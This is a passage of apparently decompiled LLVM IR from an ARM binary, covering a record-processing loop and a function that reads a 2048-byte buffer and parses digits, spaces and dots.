  %v1_d2bc = phi i32 [ %v1_d374, %dec_label_pc_d2f8 ], [ 0, %dec_label_pc_d2a8 ]
  %v5_d2b0 = mul i32 %v1_d2bc, 24
  %v1_d2b4 = load i32, i32* @sl, align 4
  %v2_d2b4 = add i32 %v1_d2b4, %v5_d2b0
  store i32 %v2_d2b4, i32* %r3.global-to-local, align 4
  %v1_d2b8 = add i32 %v2_d2b4, 20
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  store i32 %v4_d2b8, i32* %r2.global-to-local, align 4
  %v0_d2bc = load i32, i32* @fp, align 4
  %v4_d2bc = mul i32 %v1_d2bc, 4
  %v5_d2bc = add i32 %v0_d2bc, %v4_d2bc
  %v6_d2bc = inttoptr i32 %v5_d2bc to i32*
  %v7_d2bc = load i32, i32* %v6_d2bc, align 4
  store i32 %v7_d2bc, i32* @r5, align 4
  %v7_d2c4 = icmp eq i8 %v3_d2b8, 31
  store i1 %v7_d2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_d2cc = add i32 %v7_d2bc, 20
  store i32 %v1_d2cc, i32* @r6, align 4
  %tmp33 = icmp ult i8 %v3_d2b8, 32
  br i1 %tmp33, label %dec_label_pc_d3a8, label %dec_label_pc_d2d4

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d2ac
  store i1 %v3_d2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d2d8, label %dec_label_pc_d3e4, label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge, %dec_label_pc_d2d4
  %v1_d2e4 = phi i32 [ %v1_d2e4.pre, %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge ], [ 65535, %dec_label_pc_d2d4 ]
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v9_d2e4 = icmp eq i32 %v3_d170, %v1_d2e4
  store i1 %v9_d2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d2e4, label %dec_label_pc_d3f8, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge, %dec_label_pc_d2e0
  %v1_d2f0 = phi i32 [ %v1_d2f0.pre, %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge ], [ %v1_d2e4, %dec_label_pc_d2e0 ]
  store i32 %v3_d174, i32* %r3.global-to-local, align 4
  %v9_d2f0 = icmp eq i32 %v3_d174, %v1_d2f0
  store i1 %v9_d2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d2f0, label %dec_label_pc_d40c, label %dec_label_pc_d2f8

dec_label_pc_d2f8:                                ; preds = %dec_label_pc_d3f8, %dec_label_pc_d2ec, %dec_label_pc_d40c
  %v2_d2fc = load i32, i32* @r5, align 4
  %v3_d2fc = add i32 %v2_d2fc, 10
  %v4_d2fc = inttoptr i32 %v3_d2fc to i16*
  store i16 0, i16* %v4_d2fc, align 2
  %v0_d300 = load i32, i32* @r5, align 4
  store i32 %v0_d300, i32* @r0, align 4
  %v2_d308 = call i32 @function_dadc(i32 %v0_d300, i32 20)
  %v3_d308 = trunc i32 %v2_d308 to i16
  %v3_d30c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d30c, i32* %r3.global-to-local, align 4
  %v3_d310 = load i32, i32* @r5, align 4
  %v4_d310 = add i32 %v3_d310, 10
  %v5_d310 = inttoptr i32 %v4_d310 to i16*
  store i16 %v3_d308, i16* %v5_d310, align 2
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d318 = load i32, i32* @r6, align 4
  %v3_d318 = add i32 %v2_d318, 6
  %v4_d318 = inttoptr i32 %v3_d318 to i16*
  store i16 0, i16* %v4_d318, align 2
  %v0_d31c = load i32, i32* @r6, align 4
  store i32 %v0_d31c, i32* @r1, align 4
  %v1_d320 = add i32 %v0_d31c, 4
  %v2_d320 = inttoptr i32 %v1_d320 to i16*
  %v3_d320 = load i16, i16* %v2_d320, align 2
  %v4_d320 = zext i16 %v3_d320 to i32
  store i32 %v4_d320, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* %r3.global-to-local, align 4
  %v1_d324 = add i32 %v0_d324, 12
  store i32 %v1_d324, i32* %r3.global-to-local, align 4
  %v0_d328 = load i32, i32* @r5, align 4
  %v4_d32c = call i32 @function_db2c(i32 %v0_d328, i32 %v0_d31c, i32 %v4_d320, i32 %v1_d324)
  %v5_d32c = trunc i32 %v4_d32c to i16
  %v3_d330 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d330, i32* %r3.global-to-local, align 4
  %v3_d334 = mul i32 %v3_d330, 32
  store i32 %v3_d334, i32* %lr.global-to-local, align 4
  %v3_d338 = load i32, i32* @r6, align 4
  %v4_d338 = add i32 %v3_d338, 6
  %v5_d338 = inttoptr i32 %v4_d338 to i16*
  store i16 %v5_d32c, i16* %v5_d338, align 2
  %v0_d33c = load i32, i32* %lr.global-to-local, align 4
  %v1_d33c = load i32, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v1_d33c, -8
  %v5_d33c = add i32 %v0_d33c, %tmp34
  store i32 %v5_d33c, i32* %lr.global-to-local, align 4
  %v0_d340 = load i32, i32* @r6, align 4
  %v1_d340 = add i32 %v0_d340, 2
  %v2_d340 = inttoptr i32 %v1_d340 to i16*
  %v3_d340 = load i16, i16* %v2_d340, align 2
  %v3_d344 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d344, i32* %r2.global-to-local, align 4
  %v1_d348 = load i32, i32* @sl, align 4
  %v2_d348 = add i32 %v1_d348, %v5_d33c
  store i32 %v2_d348, i32* @lr, align 4
  %v3_d34c = add i32 %v2_d348, 2
  %v4_d34c = inttoptr i32 %v3_d34c to i16*
  store i16 %v3_d340, i16* %v4_d34c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d358 = load i32, i32* @r5, align 4
  store i32 %v0_d358, i32* @r1, align 4
  %v0_d35c = load i32, i32* %r2.global-to-local, align 4
  %v1_d35c = add i32 %v0_d35c, 32
  store i32 %v1_d35c, i32* @r2, align 4
  %v0_d360 = load i32, i32* @sb, align 4
  store i32 %v0_d360, i32* @r0, align 4
  %v0_d36c = call i32 @function_14ae4()
  %v3_d370 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d370, i32* %r3.global-to-local, align 4
  %v1_d374 = add i32 %v3_d370, 1
  %v1_d378 = load i32, i32* @r8, align 4
  %v9_d378 = icmp eq i32 %v1_d374, %v1_d378
  store i1 %v9_d378, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d374, i32* %stack_var_-44, align 4
  %v5_d380 = icmp slt i32 %v1_d374, %v1_d378
  br i1 %v5_d380, label %dec_label_pc_d2ac, label %dec_label_pc_d384

dec_label_pc_d384:                                ; preds = %dec_label_pc_d394, %dec_label_pc_d2f8, %dec_label_pc_d384.preheader
  %v0_d398 = phi i32 [ %v0_d398.ph, %dec_label_pc_d384.preheader ], [ 0, %dec_label_pc_d394 ], [ %v1_d378, %dec_label_pc_d2f8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d388 = icmp eq i32 %v0_d398, 0
  store i1 %v2_d388, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d388, label %dec_label_pc_d394, label %dec_label_pc_d2a8

dec_label_pc_d394:                                ; preds = %dec_label_pc_d384
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_d384

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d2ac
  %v1_d3a8 = add i32 %v2_d2b4, 16
  %v2_d3a8 = inttoptr i32 %v1_d3a8 to i32*
  %v3_d3a8 = load i32, i32* %v2_d3a8, align 4
  %v1_d3ac = call i32 @function_14a1c(i32 %v3_d3a8)
  store i32 %v1_d3ac, i32* @r4, align 4
  %v0_d3b4 = call i32 @function_f570()
  %v3_d3b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v5_d3c0 = mul i32 %v3_d3b8, 24
  %v1_d3c4 = load i32, i32* @sl, align 4
  %v2_d3c4 = add i32 %v1_d3c4, %v5_d3c0
  store i32 %v2_d3c4, i32* %r3.global-to-local, align 4
  %v1_d3c8 = add i32 %v2_d3c4, 20
  %v2_d3c8 = inttoptr i32 %v1_d3c8 to i8*
  %v3_d3c8 = load i8, i8* %v2_d3c8, align 1
  %v4_d3c8 = zext i8 %v3_d3c8 to i32
  store i32 %v4_d3c8, i32* %r2.global-to-local, align 4
  %v0_d3cc = load i32, i32* @r4, align 4
  %v7_d3cc = lshr i32 %v0_d3b4, %v4_d3c8
  %v8_d3cc = add i32 %v7_d3cc, %v0_d3cc
  %v1_d3d0 = call i32 @function_14874(i32 %v8_d3cc)
  %v1_d3d8 = load i32, i32* @r7, align 4
  %v9_d3d8 = icmp eq i32 %v3_d16c, %v1_d3d8
  store i1 %v9_d3d8, i1* %cpsr_z.global-to-local, align 1
  %v1_d3dc = load i32, i32* @r5, align 4
  %v2_d3dc = add i32 %v1_d3dc, 16
  %v3_d3dc = inttoptr i32 %v2_d3dc to i32*
  store i32 %v1_d3d0, i32* %v3_d3dc, align 4
  br i1 %v9_d3d8, label %dec_label_pc_d3e4, label %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge

dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge:    ; preds = %dec_label_pc_d3a8
  %v1_d2e4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d2e0

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3a8, %dec_label_pc_d2d4
  %v0_d3e4 = call i32 @function_f570()
  %v1_d3e4 = trunc i32 %v0_d3e4 to i16
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v1_d3ec = load i32, i32* @r7, align 4
  %v9_d3ec = icmp eq i32 %v3_d170, %v1_d3ec
  store i1 %v9_d3ec, i1* %cpsr_z.global-to-local, align 1
  %v3_d3f0 = load i32, i32* @r5, align 4
  %v4_d3f0 = add i32 %v3_d3f0, 4
  %v5_d3f0 = inttoptr i32 %v4_d3f0 to i16*
  store i16 %v1_d3e4, i16* %v5_d3f0, align 2
  br i1 %v9_d3ec, label %dec_label_pc_d3f8, label %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge

dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v1_d2f0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d2ec

dec_label_pc_d3f8:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d2e0
  %v0_d3f8 = call i32 @function_f570()
  %v1_d3f8 = trunc i32 %v0_d3f8 to i16
  store i32 %v3_d174, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* @r7, align 4
  %v9_d400 = icmp eq i32 %v3_d174, %v1_d400
  store i1 %v9_d400, i1* %cpsr_z.global-to-local, align 1
  %v3_d404 = load i32, i32* @r5, align 4
  %v4_d404 = add i32 %v3_d404, 20
  %v5_d404 = inttoptr i32 %v4_d404 to i16*
  store i16 %v1_d3f8, i16* %v5_d404, align 2
  br i1 %v9_d400, label %dec_label_pc_d40c, label %dec_label_pc_d2f8

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d3f8, %dec_label_pc_d2ec
  %v0_d40c = call i32 @function_f570()
  %v1_d40c = trunc i32 %v0_d40c to i16
  %v3_d410 = load i32, i32* @r6, align 4
  %v4_d410 = add i32 %v3_d410, 2
  %v5_d410 = inttoptr i32 %v4_d410 to i16*
  store i16 %v1_d40c, i16* %v5_d410, align 2
  br label %dec_label_pc_d2f8

dec_label_pc_d418:                                ; preds = %dec_label_pc_d12c
  %v0_d418 = load i32, i32* @sb, align 4
  store i32 %v0_d418, i32* @r0, align 4
  %v1_d41c = call i32 @function_15b6c(i32 %v0_d418)
  br label %dec_label_pc_d420

dec_label_pc_d420:                                ; preds = %dec_label_pc_d024, %dec_label_pc_d418
  %v1_d428 = phi i32 [ %v3_d11c, %dec_label_pc_d024 ], [ %v1_d41c, %dec_label_pc_d418 ]
  store i32 %v3_d024, i32* %r4.global-to-local, align 4
  store i32 %v27_d024, i32* %lr.global-to-local, align 4
  ret i32 %v1_d428

; uselistorder directives
  uselistorder i32 %v1_d374, { 2, 0, 3, 1 }
  uselistorder i32 %v5_d33c, { 1, 0 }
  uselistorder i32 %v0_d290, { 1, 0 }
  uselistorder i32 %v1_d214, { 1, 2, 0 }
  uselistorder i32 %v1_d210, { 1, 0, 2, 3 }
  uselistorder i1 %v3_d2d8, { 1, 0 }
  uselistorder i32 %v3_d16c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_d14c, { 1, 0 }
  uselistorder i1 %v7_d120, { 1, 0 }
  uselistorder i32 %v3_d11c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v5_d078, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 13, 1, 7, 8, 9, 10, 11, 12, 14, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 21, 22, 23, 14, 15, 16, 17, 18, 19, 20, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 10, 11, 12, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 11, 12, 10, 13, 14, 15 }
  uselistorder i8 -16, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d420, { 1, 0 }
  uselistorder label %dec_label_pc_d2f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d198, { 1, 0 }
}

define i32 @function_d430(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d430:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v3_d430 = load i32, i32* @r4, align 4
  %v6_d430 = load i32, i32* @r5, align 4
  %v9_d430 = load i32, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d450 = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_d454 = load i32, i32* @r5, align 4
  store i32 %v0_d454, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d460 = load i32, i32* @r4, align 4
  store i32 %v0_d460, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d468 = inttoptr i32 %v0_d454 to i32*
  %v6_d468 = call i32 @function_a430(i32 %v0_d460, i32* %v5_d468, i32 2, i32 0)
  %v1_d474 = urem i32 %v6_d468, 256
  store i32 %v1_d474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d480 = load i32, i32* @r4, align 4
  store i32 %v0_d480, i32* %r0.global-to-local, align 4
  %v0_d484 = load i32, i32* @r5, align 4
  store i32 %v0_d484, i32* %r1.global-to-local, align 4
  %v5_d488 = trunc i32 %v6_d468 to i8
  %v6_d48c = inttoptr i32 %v0_d484 to i32*
  %v7_d48c = call i32 @function_a430(i32 %v0_d480, i32* %v6_d48c, i32 3, i32 65535)
  %v0_d490 = load i32, i32* @r5, align 4
  store i32 %v0_d490, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d49c = load i32, i32* @r4, align 4
  store i32 %v0_d49c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d4a4 = inttoptr i32 %v0_d490 to i32*
  %v6_d4a4 = call i32 @function_a430(i32 %v0_d49c, i32* %v5_d4a4, i32 4, i32 64)
  %v1_d4ac = urem i32 %v6_d4a4, 256
  store i32 %v1_d4ac, i32* %ip.global-to-local, align 4
  %v0_d4b0 = load i32, i32* @r5, align 4
  store i32 %v0_d4b0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d4bc = load i32, i32* @r4, align 4
  store i32 %v0_d4bc, i32* %r0.global-to-local, align 4
  %v6_d4c4 = inttoptr i32 %v0_d4b0 to i32*
  %v7_d4c4 = call i32 @function_a430(i32 %v0_d4bc, i32* %v6_d4c4, i32 5, i32 0)
  %v1_d4d0 = urem i32 %v7_d4c4, 256
  store i32 %v1_d4d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d4dc = load i32, i32* @r4, align 4
  store i32 %v0_d4dc, i32* %r0.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r5, align 4
  store i32 %v0_d4e0, i32* %r1.global-to-local, align 4
  %v5_d4e8 = inttoptr i32 %v0_d4e0 to i32*
  %v6_d4e8 = call i32 @function_a430(i32 %v0_d4dc, i32* %v5_d4e8, i32 6, i32 65535)
  %v0_d4ec = load i32, i32* @r5, align 4
  store i32 %v0_d4ec, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d4f8 = load i32, i32* @r4, align 4
  store i32 %v0_d4f8, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_d500 = inttoptr i32 %v0_d4ec to i32*
  %v6_d500 = call i32 @function_a430(i32 %v0_d4f8, i32* %v5_d500, i32 7, i32 53)
  %v0_d508 = load i32, i32* @r5, align 4
  store i32 %v0_d508, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v6_d500, i32* @fp, align 4
  %v0_d518 = load i32, i32* @r4, align 4
  store i32 %v0_d518, i32* %r0.global-to-local, align 4
  %v4_d51c = inttoptr i32 %v0_d508 to i32*
  %v5_d51c = call i32 @function_a430(i32 %v0_d518, i32* %v4_d51c, i32 9, i32 65535)
  %v0_d520 = load i32, i32* @r5, align 4
  store i32 %v0_d520, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_d51c, i32* @sb, align 4
  %v0_d530 = load i32, i32* @r4, align 4
  store i32 %v0_d530, i32* %r0.global-to-local, align 4
  %v4_d534 = inttoptr i32 %v0_d520 to i32*
  %v5_d534 = call i32 @function_a430(i32 %v0_d530, i32* %v4_d534, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d540 = load i32, i32* @r5, align 4
  store i32 %v0_d540, i32* %r1.global-to-local, align 4
  store i32 %v5_d534, i32* @sl, align 4
  %v0_d548 = load i32, i32* @r4, align 4
  store i32 %v0_d548, i32* %r0.global-to-local, align 4
  %v5_d54c = inttoptr i32 %v0_d540 to i32*
  %v6_d54c = call i32 @function_9f04(i32 %v0_d548, i32* %v5_d54c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d558 = call i32 @function_11ad8(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_d564 = call i32 @function_11a14(i32 30, i32* null)
  store i32 %v3_d564, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d56c = call i32 @function_1312c(i32 %v3_d564, i32 0)
  store i32 %v2_d56c, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d578 = call i32 @function_11a38(i32 30)
  store i32 %v1_d578, i32* %r0.global-to-local, align 4
  %v0_d57c = load i32, i32* @r4, align 4
  %v1_d57c = icmp slt i32 %v0_d57c, 0
  %v2_d57c = icmp eq i32 %v0_d57c, 0
  store i1 %v2_d57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d57c, label %dec_label_pc_da30, label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d430
  %v2_d588 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d588, i32* @r7, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_d588, i32* %r1.global-to-local, align 4
  store i32 %v0_d57c, i32* %r0.global-to-local, align 4
  %v3_d598 = call i32 @function_15be8(i32 %v0_d57c, i32 %v2_d588, i32 2048)
  store i32 %v3_d598, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* @r4, align 4
  store i32 %v0_d5a0, i32* @r0, align 4
  %v1_d5a4 = call i32 @function_15b6c(i32 %v0_d5a0)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d5ac = call i32 @function_11ad8(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_d5b8 = call i32 @function_11a14(i32 31, i32* null)
  %v0_d5bc = load i32, i32* @r5, align 4
  store i32 %v0_d5bc, i32* @r1, align 4
  store i32 %v3_d5b8, i32* %r2.global-to-local, align 4
  store i32 %v2_d588, i32* %r0.global-to-local, align 4
  %v3_d5c8 = bitcast i32* %stack_var_-2124 to i8*
  %v4_d5c8 = call i32 @function_126cc(i8* %v3_d5c8, i32 %v0_d5bc, i32 %v3_d5b8)
  store i32 %v4_d5c8, i32* @r6, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d5d4 = call i32 @function_11a38(i32 31)
  store i32 %v1_d5d4, i32* %r0.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @r6, align 4
  %v7_d5d8 = icmp eq i32 %v0_d5d8, -1
  store i1 %v7_d5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d5d8, label %dec_label_pc_da30, label %dec_label_pc_d5e0

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d584
  %v0_d5e0 = load i32, i32* @r5, align 4
  %v9_d5e0 = icmp eq i32 %v0_d5e0, %v0_d5d8
  store i1 %v9_d5e0, i1* %cpsr_z.global-to-local, align 1
  %v7_d5e4 = icmp sgt i32 %v0_d5e0, %v0_d5d8
  br i1 %v7_d5e4, label %dec_label_pc_d5e8, label %dec_label_pc_da30

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d5e0
  %v0_d5e8 = load i32, i32* @r7, align 4
  %v2_d5e8 = add i32 %v0_d5e8, %v0_d5d8
  store i32 %v2_d5e8, i32* %r1.global-to-local, align 4
  store i32 %v0_d5d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d614 = add i32 %v0_d5e0, -1
  br label %dec_label_pc_d60c

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d634, %bb79
  %v9_d5f8 = icmp eq i32 %v1_d614, %v0_d600
  store i1 %v9_d5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d5f8, label %dec_label_pc_d644, label %dec_label_pc_d600

dec_label_pc_d600:                                ; preds = %dec_label_pc_d624, %dec_label_pc_d5f8, %bb
  %v0_d63019 = phi i32 [ %v0_d630, %dec_label_pc_d624 ], [ %v0_d63020, %dec_label_pc_d5f8 ], [ %v0_d630, %bb ]
  %v0_d61015 = phi i32 [ 0, %dec_label_pc_d624 ], [ %v0_d61016, %dec_label_pc_d5f8 ], [ 0, %bb ]
  %v1_d600 = add i32 %v0_d600, 1
  store i32 %v1_d600, i32* %r2.global-to-local, align 4
  %v9_d604 = icmp eq i32 %v1_d600, %v0_d5e0
  store i1 %v9_d604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d604, label %dec_label_pc_da30, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d600, %dec_label_pc_d5e8
  %v0_d600 = phi i32 [ %v1_d600, %dec_label_pc_d600 ], [ %v0_d5d8, %dec_label_pc_d5e8 ]
  %v0_d630 = phi i32 [ %v0_d63019, %dec_label_pc_d600 ], [ 0, %dec_label_pc_d5e8 ]
  %v0_d610 = phi i32 [ %v0_d61015, %dec_label_pc_d600 ], [ 0, %dec_label_pc_d5e8 ]
  %v0_d618 = phi i32 [ %v1_d618, %dec_label_pc_d600 ], [ %v2_d5e8, %dec_label_pc_d5e8 ]
  %v1_d60c = inttoptr i32 %v0_d618 to i8*
  %v2_d60c = load i8, i8* %v1_d60c, align 1
  %v3_d60c = zext i8 %v2_d60c to i32
  store i32 %v3_d60c, i32* %r3.global-to-local, align 4
  %v2_d610 = icmp eq i32 %v0_d610, 0
  store i1 %v2_d610, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d614, i32* @r4, align 4
  %v1_d618 = add i32 %v0_d618, 1
  store i32 %v1_d618, i32* %r1.global-to-local, align 4
  %v1_d61c = add nsw i32 %v3_d60c, -48
  store i32 %v1_d61c, i32* %r0.global-to-local, align 4
  br i1 %v2_d610, label %dec_label_pc_d624, label %dec_label_pc_d634

dec_label_pc_d624:                                ; preds = %dec_label_pc_d60c
  %v7_d624 = icmp eq i8 %v2_d60c, 9
  store i1 %v7_d624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d624, label %dec_label_pc_d600, label %bb

bb:                                               ; preds = %dec_label_pc_d624
  %v8_d628 = icmp eq i8 %v2_d60c, 32
  store i1 %v8_d628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d628, label %dec_label_pc_d600, label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %bb
  %v1_d630 = add i32 %v0_d630, 1
  store i32 %v1_d630, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d634

dec_label_pc_d634:                                ; preds = %dec_label_pc_d60c, %dec_label_pc_d630
  %v0_d63020 = phi i32 [ %v0_d630, %dec_label_pc_d60c ], [ %v1_d630, %dec_label_pc_d630 ]
  %v0_d61016 = phi i32 [ %v0_d610, %dec_label_pc_d60c ], [ %v1_d630, %dec_label_pc_d630 ]
  %v7_d634 = icmp eq i8 %v2_d60c, 46
  store i1 %v7_d634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d634, label %dec_label_pc_d5f8, label %bb79

bb79:                                             ; preds = %dec_label_pc_d634
  %v8_d638 = icmp eq i32 %v1_d61c, 9
  store i1 %v8_d638, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_d61c, 10
  br i1 %tmp, label %dec_label_pc_d5f8, label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %bb79
  store i32 %v0_d600, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d644

dec_label_pc_d644:                                ; preds = %dec_label_pc_d5f8, %dec_label_pc_d640
  %v0_d60090 = phi i32 [ %v0_d600, %dec_label_pc_d640 ], [ %v1_d614, %dec_label_pc_d5f8 ]
  %v2_d648 = sub i32 %v0_d60090, %v0_d5d8
  store i32 %v2_d648, i32* @r4, align 4
  %v2_d64c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d64c, i32* @r5, align 4
  store i32 %v2_d5e8, i32* %r1.global-to-local, align 4
  store i32 %v2_d64c, i32* %r0.global-to-local, align 4
  store i32 %v2_d648, i32* %r2.global-to-local, align 4
  %v3_d65c = call i32 @function_123e0(i32 %v2_d64c, i32 %v2_d5e8, i32 %v2_d648)
  %v2_d660 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d660, i32* %r1.global-to-local, align 4
  %v1_d664 = load i32, i32* @r4, align 4
  %v2_d664 = add i32 %v1_d664, %v2_d660
  store i32 %v2_d664, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d64c, i32* @r0, align 4
  %v3_d670 = add i32 %v2_d664, -36
  %v4_d670 = inttoptr i32 %v3_d670 to i8*
  store i8 0, i8* %v4_d670, align 1
  %v1_d674 = call i32 @function_148ac(i32 %v2_d64c)
  store i32 %v1_d674, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_d67c3:                               ; preds = %dec_label_pc_da30
  unreachable

dec_label_pc_d67c:                                ; preds = %dec_label_pc_dabc, %dec_label_pc_daac, %dec_label_pc_da94, %dec_label_pc_da7c, %dec_label_pc_d644
